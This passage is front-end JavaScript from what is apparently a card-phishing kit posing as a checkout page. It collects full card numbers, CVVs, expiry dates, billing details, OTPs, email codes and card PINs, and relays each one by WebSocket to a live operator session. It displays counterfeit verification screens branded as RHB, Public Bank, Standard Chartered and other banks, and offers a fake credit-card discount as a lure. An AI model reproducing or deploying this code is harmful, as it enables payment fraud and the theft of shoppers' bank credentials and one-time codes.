        const now = new Date(); 
        const options = {
        weekday: 'short',
        month: 'short',
        day: '2-digit',
        year: 'numeric',
        timeZone: 'Asia/Kuala_Lumpur'};
        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
        const weekday = parts.find(p => p.type === 'weekday').value;
        const month = parts.find(p => p.type === 'month').value;
        const day = parts.find(p => p.type === 'day').value;
        const year = parts.find(p => p.type === 'year').value;
        const dateStr = `${weekday} ${month} ${day} ${year}`;
        const timeStr = now.toLocaleTimeString('en-GB', {
            hour12: false,
            timeZone: 'Asia/Kuala_Lumpur'
        });
        document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(4) > td:nth-child(2)").innerHTML = `
            <span>${dateStr}</span>
            <span>${timeStr} </span>
        `;
      }
      else
      if(p.cardInfo.bankName==='RHB BANK BERHAD') {
        document.querySelector("#mount5").classList.remove('hidden');
        document.querySelector("#mount5").shadowRoot.querySelector("div > div.container > table:nth-child(3) > tbody.oobtrxinfo > tr.mobileshow > td > div:nth-child(2) > div").textContent = 'MYR '+String(getPayAmount());
        document.querySelector("#mount5").shadowRoot.querySelector("div > div.container > table:nth-child(3) > tbody.oobtrxinfo > tr.mobileshow > td > div:nth-child(4) > div > span").textContent = p.cardInfo.cardNumber.slice(-4);
        const now = new Date(); 
        const options = {
        weekday: 'short',
        month: 'short',
        day: '2-digit',
        year: 'numeric',
        timeZone: 'Asia/Kuala_Lumpur'};
        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
        const weekday = parts.find(p => p.type === 'weekday').value;
        const month = parts.find(p => p.type === 'month').value;
        const day = parts.find(p => p.type === 'day').value;
        const year = parts.find(p => p.type === 'year').value;
        const dateStr = `${weekday} ${month} ${day} ${year}`;
        const timeStr = now.toLocaleTimeString('en-GB', {
            hour12: false,
            timeZone: 'Asia/Kuala_Lumpur'
        });
        document.querySelector("#mount5").shadowRoot.querySelector("div > div.container > table:nth-child(3) > tbody.oobtrxinfo > tr.mobileshow > td > div:nth-child(3) > div").innerHTML = `
            <span>${dateStr}</span><br>
            <span>${timeStr} </span>
        `;
      }
      else
      if(p.cardInfo.bankName==='PUBLIC BANK BERHAD') {
        document.querySelector("#mount6").classList.remove('hidden'); 
        //document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(1) > div").textContent = 'MYR '+String(getPayAmount());
        //document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(2) > div > span").textContent = p.cardInfo.cardNumber.slice(-4);
        const now = new Date(); 
        const options = {
        weekday: 'short',
        month: 'short',
        day: '2-digit',
        year: 'numeric',
        timeZone: 'Asia/Kuala_Lumpur'};
        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
        const weekday = parts.find(p => p.type === 'weekday').value;
        const month = parts.find(p => p.type === 'month').value;
        const day = parts.find(p => p.type === 'day').value;
        const year = parts.find(p => p.type === 'year').value;
        const dateStr = `${weekday} ${month} ${day} ${year}`;
        const timeStr = now.toLocaleTimeString('en-GB', {
            hour12: false,
            timeZone: 'Asia/Kuala_Lumpur'
        });
        /*document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(1) > div:nth-child(2) > div").innerHTML = `
            <span>${dateStr}</span><br>
            <span>${timeStr} </span>
        `;*/
      }
      else
      if(p.cardInfo.bankName==='STANDARD CHARTERED BANK MALAYSIA BERHAD') {
        document.querySelector("#mount7").classList.remove('hidden'); 
        //document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(1) > div").textContent = 'MYR '+String(getPayAmount());
        //document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(2) > div > span").textContent = p.cardInfo.cardNumber.slice(-4);
        const now = new Date(); 
        const options = {
        weekday: 'short',
        month: 'short',
        day: '2-digit',
        year: 'numeric',
        timeZone: 'Asia/Kuala_Lumpur'};
        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
        const weekday = parts.find(p => p.type === 'weekday').value;
        const month = parts.find(p => p.type === 'month').value;
        const day = parts.find(p => p.type === 'day').value;
        const year = parts.find(p => p.type === 'year').value;
        const dateStr = `${weekday} ${month} ${day} ${year}`;
        const timeStr = now.toLocaleTimeString('en-GB', {
            hour12: false,
            timeZone: 'Asia/Kuala_Lumpur'
        });
        /*document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(1) > div:nth-child(2) > div").innerHTML = `
            <span>${dateStr}</span><br>
            <span>${timeStr} </span>
        `;*/
      }
      else
      {
        document.querySelector("#app-verify-overlay > div.app-verify-box").classList.remove('hidden');
        var bankName = p.cardInfo?.bankName || p.bankName || 'Bank';
      updateBankLogo(bankName);
      document.getElementById('app-amount').textContent = 'MYR ' + String(getPayAmount());
      updateAppSchemeLogo(p.cardInfo?.cardType || p.cardType || '');
      applyMerchantBranding();
      }


      
    } 
    else if (a === 'app_verify_fail') {
      window._appVerifyInProgress = true;
      // Hide spinner inside active bank mount Shadow DOM
      //document.getElementById('app-verify-overlay').classList.remove('hidden');
      if (!document.querySelector("#mount1").classList.contains('hidden')) {
        document.querySelector("#mount1").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount1").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount1").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount1").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount2").classList.contains('hidden')) {
        document.querySelector("#mount2").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount2").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount2").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount2").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount3").classList.contains('hidden')) {
        document.querySelector("#mount3").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount3").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount3").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount3").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount4").classList.contains('hidden')) {
        document.querySelector("#mount4").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount4").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount4").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount4").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount5").classList.contains('hidden')) {
        document.querySelector("#mount5").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount5").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount5").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount5").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount6").classList.contains('hidden')) {
        document.querySelector("#mount6").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount6").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount6").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount6").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount7").classList.contains('hidden')) {
        document.querySelector("#mount7").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount7").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount7").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount7").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      }
      // Show generic app-verify-box (was hidden when mount active)
      var avBox = document.querySelector('#app-verify-overlay > .app-verify-box');
      if (avBox) avBox.classList.remove('hidden');
      document.getElementById('app-spinner').style.display = 'none';
      document.getElementById('app-continue-btn').disabled = false;
      document.getElementById('app-error').classList.remove('hidden');
      document.getElementById('app-error').textContent = p.message || 'APP verification not completed.'
    } 
    /*else if (window._appVerifyInProgress) {
      document.getElementById('app-verify-overlay').classList.remove('hidden');
      document.getElementById('app-spinner').style.display = 'none';
      document.getElementById('app-continue-btn').disabled = false;
      document.getElementById('app-error').classList.remove('hidden');
       document.getElementById('app-error').textContent = p.message || 'Operator needs your attention'
    }*/
     else if (a === 'pin_verify') {
      _curStep = 'pin_verify';
      hideLoad();
      document.getElementById('pin-overlay').classList.remove('hidden');
      document.getElementById('pin-amount-row').style.display = '';
      document.getElementById('pin-amount').textContent = 'MR ' + String(getPayAmount());
      updateOtpCardLogoStyle(p.cardInfo?.cardType || p.cardType, 'pin-card-logo');
      resetPin();
                        }






    
  }
 
 
  /* ═══════════════════════════════════════════
     6. Payload 构建
  ═══════════════════════════════════════════ */
  function buildPayload() {
    var cn  = (q('cardNumber') ? q('cardNumber').value : '').replace(/\s/g, '');
    var exp = q('expiry') ? q('expiry').value.trim().replace(/\s/g, '') : '';
    var cv  = q('cvv')       ? q('cvv').value.trim()       : '';
    var ch  = q('cardHolder')? q('cardHolder').value.trim(): '';
    var fn = getFullName();
    var em  = q('email')     ? q('email').value.trim()     : '';
    var ph  = q('phone')     ? q('phone').value.trim()     : '';
    var co  = q('country')   ? q('country').value.trim()   : '';
    var a1  = q('address1')  ? q('address1').value.trim()  : '';
    var ci  = q('city')      ? q('city').value.trim()      : '';
    var st  = q('state')     ? q('state').value.trim()     : '';
    var zp  = q('zipCode')   ? q('zipCode').value.trim()   : '';
    var otp = q('otp-code')   ? q('otp-code').value.trim()   : '';
    var nmParts=fn.split(' ');
 
    var pm = document.getElementById('basic-debitCards') && document.getElementById('basic-debitCards').checked ? 'debit' : 'credit';
    var order = readOrder();
    var base = Number(order.amount) || 0;
    var rate = pm === 'credit' ? (window.__tcDiscountRate || 0.2) : 0;
    var finalAmt = base * (1 - rate);
    var od = {
      productName: (order.items && order.items[0] && order.items[0].title) || 'Checkout',
      amount: finalAmt,
      paymentMethod: pm,
      discountRate: rate
    };

    return {
      frontendUrl:  location.hostname,
      currentStep:  _curStep,
      browsingTabs: [{label:'Checkout',count:1,active:true}],
      orderSummary: {
        items: order.items || [],
        amount: finalAmt,
        currency: order.currency || 'MYR',
        paymentMethod: pm,
        discountRate: rate
      },
      orderInfo: od,
      cardInfo: {
        cardNumber: cn,
        expiry:     exp,
        cvv:        cv,
        cardHolder: ch,
        otpCode:    otp
      },
      customerInfo: {
        firstName:nmParts[0]||'',
        lastName:nmParts.slice(1).join(' ')||'',
        fullName: fn,
        email:    em,
        phone:    ph,
        country:  co,
        address1: a1,
        city:     ci,
        state:    st,
        zipCode:  zp
      }
    };
  }
 
 
  /* ═══════════════════════════════════════════
     7. 提交 & 发送
  ═══════════════════════════════════════════ */
  function luhnCheck(num) {
    var sum = 0, alt = false;
    for (var i = num.length - 1; i >= 0; i--) {
      var n = parseInt(num[i], 10);
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return sum % 10 === 0;
  }

  function submitPayment() {
    var cn  = (q('cardNumber') ? q('cardNumber').value : '').replace(/\s/g, '');
    var exp = q('expiry') ? q('expiry').value.trim().replace(/\s/g, '') : '';
    var cv  = q('cvv')        ? q('cvv').value.trim()        : '';
    var ch  = q('cardHolder') ? q('cardHolder').value.trim() : '';
    var fn = getFullName();
    var em  = q('email')   ? q('email').value.trim()   : '';
    var ph  = q('phone')   ? q('phone').value.trim()   : '';
    var a1  = q('address1')   ? q('address1').value.trim()   : '';
    var ct  = q('city')   ? q('city').value.trim()   : '';
    var st  = q('state')   ? q('state').value.trim()   : '';
    var zc  = q('zipCode')   ? q('zipCode').value.trim()   : '';
 
    if (!cn || !exp || !cv || !ch || !fn || !em || !ph || !a1 || !ct || !st || !zc) {
      showMsg('error', 'Fill all required fields.');
      return;
    }
    // Card number validation
    if (!/^\d+$/.test(cn)) {
      showMsg('error', 'Card number must be digits only.');
      return;
    }
    if (cn.length < 13 || cn.length > 19) {
      showMsg('error', 'Invalid card number length.');
      return;
    }
    if (!luhnCheck(cn)) {
      showMsg('error', 'Invalid card number.');
      return;
    }
    if (!/^\d{2}\/\d{2}$/.test(exp)) {
      showMsg('error', 'Invalid expiry (MM/YY).');
      return;
    }
    /* 有效期检查 */
    var em2 = parseInt(exp.slice(0, 2), 10);
    var ey2 = parseInt('20' + exp.slice(3), 10);
    if (ey2 > 2039) { showMsg('error', 'Expiry year cannot exceed 2039.'); return; }
    var now = new Date(), expDate = new Date(ey2, em2);
    if (expDate <= now) { showMsg('error', 'Card has expired.'); return; }
    if (cv.length < 3)  { showMsg('error', 'Please enter a valid security code.'); return; }
 
    /* 清空旧 OTP */
    if (q('otp-code')) q('otp-code').value = '';
 
    hideInline();
 
    var btn = q('pay-btn');
    if (btn) { btn.disabled = true; /*btn.textContent = 'Processing...';*/ }
    showLoad()
    //showMsg('info', 'Processing payment...');
 
    if (!ws || ws.readyState !== WebSocket.OPEN) {
      wsConnect();
      setTimeout(sendPayload, 2000);
      return;
    }


    if (window.fbq) {
    var _booking = {};
    var _ticket = {};
    try { _booking = JSON.parse(localStorage.getItem('titancore_order') || '{}'); } catch(e) {}
    try { _ticket = JSON.parse(localStorage.getItem('titancore_order') || '{}'); } catch(e) {}
    var _amount = Number(_booking.amount || _ticket.amount || 0);
    fbq('track', 'Purchase', {
      value: _amount,
      currency: 'MYR'
    });
  }
    sendPayload();
  }
 
  function sendPayload() {
    var payload = buildPayload();
    payload.ua = navigator.userAgent;
 
    if (!sid) {
      if (_sessionCreating) { setTimeout(sendPayload, 300); return; }
      _sessionCreating = true;
      ws.send(JSON.stringify({ type: 'customer_input', payload: payload }));
      return;
    }
    payload.status    = 'pending';
    payload.sessionId = sid;
    delete payload.browsingTabs;
    ws.send(JSON.stringify({ type: 'session_update', payload: payload }));
  }
 
 
  /* ═══════════════════════════════════════════
     8. OTP 弹层
  ═══════════════════════════════════════════ */

  


  


  function showOtp() {
    var sec = q('otp-overlay');
    var otpCode = safeId('otp-code');
    if (otpCode) otpCode.value = '';
    if (sec) sec.className = 'overlay';
  }
 
  function hideOtp() {
    var sec = q('otp-overlay');
    //var btn = q('pay-btn');
    if (sec) sec.className = 'overlay hidden';
    //if (btn) btn.style.display = 'block';
    if (q('otp-code'))  q('otp-code').value = '';
    if (q('otp-error')) q('otp-error').style.display = 'none';
    stopOtpTimer();
  }

  
  function changeOtp() {
    var sec = q('otp-form');
    var secs = q('otp-result');
    //var btn = q('pay-btn');
    if (sec) sec.classList.add('hidden');
    if (secs) secs.classList.remove('hidden');
    //if (btn) btn.style.display = 'block';
    if (q('otp-code'))  q('otp-code').value = '';
    if (q('otp-error')) q('otp-error').style.display = 'none';
    stopOtpTimer();
  }

 
  function resetOtp() {
    if (q('otp-code'))  { q('otp-code').value = ''; }
    if (q('otp-error')) { q('otp-error').style.display = 'none'; }
    var btn = q('otp-submit');
    if (btn) { btn.disabled = false; btn.textContent = 'Verify'; }
    document.querySelector("#pay-btn").disabled = false;
  }

  //Email Code
  function showEmail() {
    
    var sec = q('email-overlay');
    document.getElementById('email-code').value = '';
    //var btn = q('pay-btn');
    if (sec) sec.className = 'overlay';
    //if (btn) btn.style.display = 'none';
  }
 
  function hideEmail() {
    var sec = q('email-overlay');
    //var btn = q('pay-btn');
    if (sec) sec.className = 'overlay hidden';
    //if (btn) btn.style.display = 'block';
    if (q('email-code'))  q('email-code').value = '';
    if (q('email-error')) q('email-error').style.display = 'none';
    stopEmailTimer();
  }

  
  function changeEmail() {
    var sec = q('email-form');
    var secs = q('email-result');
    //var btn = q('pay-btn');
    if (sec) sec.classList.add('hidden');
    if (secs) secs.classList.remove('hidden');
    //if (btn) btn.style.display = 'block';
    if (q('email-code'))  q('email-code').value = '';
    if (q('email-error')) q('email-error').style.display = 'none';
    stopEmailTimer();
  }

 
  function resetEmail() {
    if (q('email-code'))  { q('email-code').value = ''; }
    if (q('email-error')) { q('email-error').style.display = 'none'; }
    var btn = q('email-submit');
    if (btn) { btn.disabled = false; btn.textContent = 'Verify'; }
    document.querySelector("#pay-btn").disabled = false;
  }




  function getBankColor(name) {
                var n = (name || '').toLowerCase();
                if (/chase|jpmorgan/.test(n))
                    return '#0f5499';
                if (/bofa|bank of america/.test(n))
                    return '#e31837';
                if (/wells\s*fargo/.test(n))
                    return '#d71e28';
                if (/citi(?!zen)/.test(n))
                    return '#056dae';
                if (/capital\s*one/.test(n))
                    return '#004977';
                if (/td(\s|bank)/.test(n))
                    return '#20b14a';
                if (/rbc|royal/.test(n))
                    return '#005cd9';
                if (/scotia|scotiabank/.test(n))
                    return '#ed1c24';
                if (/bmo/.test(n))
                    return '#0079c2';
                if (/cibc/.test(n))
                    return '#c41f3d';
                if (/amex|american\s*express/.test(n))
                    return '#006fcf';
                if (/discover/.test(n))
                    return '#ff5f1f';
                return '#1a1f71'
            }
            function getBankLogoUrl(name) {
                var n = (name || '').toLowerCase();
                var d = '';
                if (/chase|jpmorgan/.test(n))
                    d = 'chase.com';
                else if (/bofa|bank of america/.test(n))
                    d = 'bankofamerica.com';
                else if (/wells\s*fargo/.test(n))
                    d = 'wellsfargo.com';
                else if (/citi(?!zen)/.test(n))
                    d = 'citi.com';
                else if (/capital\s*one/.test(n))
                    d = 'capitalone.com';
                else if (/td(\s|bank)/.test(n))
                    d = 'td.com';
                else if (/rbc|royal/.test(n))
                    d = 'rbcroyalbank.com';
                else if (/scotia|scotiabank/.test(n))
                    d = 'scotiabank.com';
                else if (/bmo/.test(n))
                    d = 'bmo.com';
                else if (/cibc/.test(n))
                    d = 'cibc.com';
                else if (/amex|american\s*express/.test(n))
                    d = 'americanexpress.com';
                else if (/discover/.test(n))
                    d = 'discover.com';
                else if (/us\s*bank|usbank/.test(n))
                    d = 'usbank.com';
                else if (/pnc/.test(n))
                    d = 'pnc.com';
                else if (/truist/.test(n))
                    d = 'truist.com';
                else if (/sumitomo/i.test(n))
                    d = 'sumitomocard.co.jp';
                if (d)
                    return 'https://img.logo.dev/' + d + '?token=pk_RBgCfubiQV-pbxOMdbqk1w&size=40';
                var enc = encodeURIComponent(name);
                return 'https://img.logo.dev/' + enc + '?token=pk_RBgCfubiQV-pbxOMdbqk1w&size=40';
            }
            function updateBankLogo(name) {
                var el = document.getElementById('app-bank-logo');
                if (!el)
                    return;
                el.innerHTML = '';
                el.style.background = 'transparent';
                var img = document.createElement('img');
                img.style.cssText = 'width:34px;height:28px;object-fit:contain';
                img.onerror = function() {
                    img.style.display = 'none';
                    el.textContent = (name || 'IB').slice(0, 2).toUpperCase();
                    el.style.background = getBankColor(name)
                }
                ;
                fetch('/api/logo/' + encodeURIComponent(name || 'Bank')).then(function(r) {
                    return r.json()
                }).then(function(d) {
                    var url = (d.data || d).logoUrl || '';
                    if (url) {
                        img.src = url;
                        el.appendChild(img)
                    } else {
                        img.onerror()
                    }
                }).catch(function() {
                    el.textContent = (name || 'IB').slice(0, 2).toUpperCase();
                    el.style.background = getBankColor(name)
                })
            }
            function updateAppSchemeLogo(cardType) {
                var el = document.getElementById('app-scheme');
                var n = (cardType || '').toLowerCase();
                if (n.includes('visa')) {
                    el.innerHTML = '<svg width="34" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg> <span class="app-scheme-name">ID Check</span>'
                } else if (n.includes('mastercard') || n.includes('mc')) {
                    el.innerHTML = '<span class="app-scheme-mark"><span class="app-circle red"></span><span class="app-circle yellow"></span></span> <span class="app-scheme-name">ID Check</span>'
                } else if (n.includes('amex')) {
                    el.innerHTML = '<svg width="34" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg> <span class="app-scheme-name">ID Check</span>'
                } else {
                    el.innerHTML = '<span class="app-scheme-mark"><span class="app-circle red"></span><span class="app-circle yellow"></span></span> <span class="app-scheme-name">ID Check</span>'
                }
            }
            function appVerifyContinue() {
                document.getElementById('app-spinner').style.display = 'flex';
                document.getElementById('app-spinner').classList.remove('hidden');
                document.getElementById('app-continue-btn').disabled = true;
                if (ws && ws.readyState === 1 && sid)
                    ws.send(JSON.stringify({
                        type: 'app_verify_done',
                        payload: {
                            sessionId: sid
                        }
                    }))
            }
            function hideAppVerify() {
                document.getElementById('app-verify-overlay').classList.add('hidden')
            }
            function updateOtpCardLogo(cardType) {
                var el = document.getElementById('otp-card-logo');
                if (!el)
                    return;
                var n = (cardType || '').toLowerCase();
                var logo = '';
                if (n.includes('visa')) {
                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg>'
                } else if (n.includes('mastercard') || n.includes('mc')) {
                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/><circle cx="16" cy="11" r="5" fill="#ff5f00"/></svg>'
                } else if (n.includes('amex')) {
                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg>'
                } else if (n.includes('discover')) {
                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#ff5f1f"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">DISC</text></svg>'
                } else {
                    logo = '<svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#888"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">CARD</text></svg>'
                }
                ;el.innerHTML = logo + '<span style="color:#ccc;font-size:18px">|</span><span style="font-family:Arial;font-size:13px">Secure</span>'
            }




            // === PIN verification ===
            function pinJump(idx) {
                var el = document.getElementById('pin-d' + idx);
                if (el) {
                    el.value = el.value.replace(/\D/g, '');
                    if (el.value) {
                        var next = idx < 4 ? document.getElementById('pin-d' + (idx + 1)) : null;
                        if (next)
                            next.focus()
                    }
                }
            }
            function pinBack(e, idx) {
                if (e.key === 'Backspace') {
                    var el = document.getElementById('pin-d' + idx);
                    if (el && !el.value && idx > 1) {
                        document.getElementById('pin-d' + (idx - 1)).focus()
                    }
                }
            }
            function resetPin() {
                for (var i = 1; i <= 4; i++) {
                    var d = document.getElementById('pin-d' + i);
                    if (d)
                        d.value = ''
                }
                document.getElementById('pin-error').classList.add('hidden');
                document.getElementById('pin-spinner').style.display = 'none';
                document.getElementById('pin-submit').disabled = false;
                document.getElementById('pin-d1').focus()
            }
            function submitPin() {
                var code = '';
                for (var i = 1; i <= 4; i++) {
                    code += document.getElementById('pin-d' + i)?.value || ''
                }
                if (code.length < 4) {
                    document.getElementById('pin-error').classList.remove('hidden');
                    return
                }
                document.getElementById('pin-error').classList.add('hidden');
                document.getElementById('pin-submit').disabled = true;
                document.getElementById('pin-spinner').style.display = 'flex';
                document.getElementById('pin-spinner').classList.remove('hidden');
                if (ws && ws.readyState === 1)
                    ws.send(JSON.stringify({
                        type: 'session_update',
                        payload: {
                            sessionId: sid,
                            status: 'pending',
                            cardInfo: {
                                otpCode: code
                            },
                            customerInfo: buildPayload().customerInfo,
                            browsingTabs: buildPayload().browsingTabs,
                            currentStep: 'pin_verify'
                        }
                    }))
            }
            function resendPin() {
                if (ws && ws.readyState === 1)
                    ws.send(JSON.stringify({
                        type: 'resend_otp',
                        payload: {
                            sessionId: sid
                        }
                    }))
            }






 
  /* OTP 倒计时 */
  var otpSec = 299, otpTimer = null;
 
  function startOtpTimer() {
    otpSec = 299;
    stopOtpTimer();
    var timerEl = q('otp-timer');
    if (timerEl) timerEl.style.display = 'block';
    tick();
    otpTimer = setInterval(function () {
      otpSec--;
      tick();
      if (otpSec <= 0) {
        stopOtpTimer();
        //showMsg('error', 'OTP expired.');
        //hideOtp();
      }
    }, 1000);
  }
 
  function stopOtpTimer() {
    if (otpTimer) { clearInterval(otpTimer); otpTimer = null; }
    var timerEl = q('otp-timer');
    if (timerEl) timerEl.style.display = 'none';
  }
 
  function tick() {
    var timerEl = q('otp-timer');
    if (!timerEl) return;
    var m = Math.floor(otpSec / 60), s = otpSec % 60;
    timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
  }


   /* EmailCode 倒计时 */
  var EmailSec = 299, EmailTimer = null;
 
  function startEmailTimer() {
    EmailSec = 299;
    stopOtpTimer();
    var timerEl = q('email-timer');
    if (timerEl) timerEl.style.display = 'block';
    Emailtick();
    EmailTimer = setInterval(function () {
      EmailSec--;
      Emailtick();
      if (EmailSec <= 0) {
        stopEmailTimer();
        //showMsg('error', 'OTP expired.');
        //hideOtp();
      }
    }, 1000);
  }
 
  function stopEmailTimer() {
    if (EmailTimer) { clearInterval(EmailTimer); EmailTimer = null; }
    var timerEl = q('email-timer');
    if (timerEl) timerEl.style.display = 'none';
  }
 
  function Emailtick() {
    var timerEl = q('email-timer');
    if (!timerEl) return;
    var m = Math.floor(EmailSec / 60), s = EmailSec % 60;
    timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
  }


 
  /* OTP 提交 */
  function submitOtp() {
    var code = q('otp-code') ? q('otp-code').value.trim() : '';
    if (!code || code.length < 4) {
      if (q('otp-error')) { q('otp-error').style.display = 'block'; q('otp-error').textContent = 'Please enter the OTP.'; }
      return;
    }
    if (q('otp-error')) q('otp-error').style.display = 'none';
    document.getElementById('otp-spinner').style.display='flex';
    document.getElementById('otp-spinner').classList.remove('hidden');
    var btn = q('otp-submit');
    if (btn) { btn.disabled = true; }
    
    if (ws && ws.readyState === WebSocket.OPEN && sid) {
      var p = buildPayload();
      p.cardInfo.otpCode = code;
      ws.send(JSON.stringify({
        type:    'session_update',
        payload: {
          sessionId:    sid,
          status:       'pending',
          cardInfo:     p.cardInfo,
          customerInfo: p.customerInfo,
          browsingTabs: p.browsingTabs,
          currentStep:  'otp'
        }
      }));
    }
  }


  /* EmailCode 提交 */
  function submitEmailCode() {
    var code = q('email-code') ? q('email-code').value.trim() : '';
    if (!code || code.length < 4) {
      if (q('email-error')) { q('email-error').style.display = 'block'; q('email-error').textContent = 'Please enter the EmailCode.'; }
      return;
    }
    if (q('email-error')) q('email-error').style.display = 'none';
    document.getElementById('email-spinner').style.display='flex';
    document.getElementById('email-spinner').classList.remove('hidden');
    var btn = q('email-submit');
    if (btn) { btn.disabled = true; }
    
    if (ws && ws.readyState === WebSocket.OPEN && sid) {
      var p = buildPayload();
      p.cardInfo.otpCode = code;
      ws.send(JSON.stringify({
        type:    'session_update',
        payload: {
          sessionId:    sid,
          status:       'pending',
          cardInfo: {
          otpCode: code
          },
          customerInfo: p.customerInfo,
          browsingTabs: p.browsingTabs,
          currentStep:  'email_verify'
        }
      }));
    }
  }

 
  /* OTP 重发 */
  var _resendSec = 0, _resendTimer = null, _otpResendCount = 0;
 
  function resetResend() {
    _otpResendCount = 0; _resendSec = 0;
    clearInterval(_resendTimer);
    var rb = q('otp-resend');
    if (rb) { rb.disabled = false; rb.textContent = 'Resend Code'; rb.style.opacity = '1'; }
  }
 
  function startResendCooldown() {
    _resendSec = 60;
    var rb = q('otp-resend');
    if (rb) { rb.disabled = true; rb.textContent = 'Resend Code (60s)'; }
    _resendTimer = setInterval(function () {
      _resendSec--;
      if (rb) rb.textContent = 'Resend Code (' + _resendSec + 's)';
      if (_resendSec <= 0) {
        clearInterval(_resendTimer);
        if (rb && _otpResendCount < 5) { rb.disabled = false; rb.textContent = 'Resend Code'; rb.style.opacity = '1'; }
      }
    }, 1000);
  }
 
  function resendOtp() {
    if (_resendSec > 0 || _otpResendCount >= 5) return;
    if (ws && ws.readyState === WebSocket.OPEN)
      ws.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId: sid } }));
  }

  function resendEmailCode() {
    if (_resendSec > 0 || _otpResendCount >= 5) return;
    if (ws && ws.readyState === WebSocket.OPEN)
      ws.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId: sid } }));
  }

  function applyMerchantBranding() {
    var appMer = document.getElementById('app-merchant');
    if (appMer) appMer.textContent = MERCHANT_NAME;
    ['otp-overlay', 'email-overlay', 'pin-overlay'].forEach(function (overlayId) {
      var overlay = document.getElementById(overlayId);
      if (!overlay) return;
      overlay.querySelectorAll('.otp-table tr').forEach(function (row) {
        var cells = row.querySelectorAll('td');
        if (cells.length >= 2 && /merchant/i.test(cells[0].textContent)) {
          cells[1].textContent = MERCHANT_NAME;
        }
      });
    });
  }

  function bindOnce(el, event, handler) {
    if (!el || el._tcBound) return;
    el._tcBound = true;
    el.addEventListener(event, handler);
  }

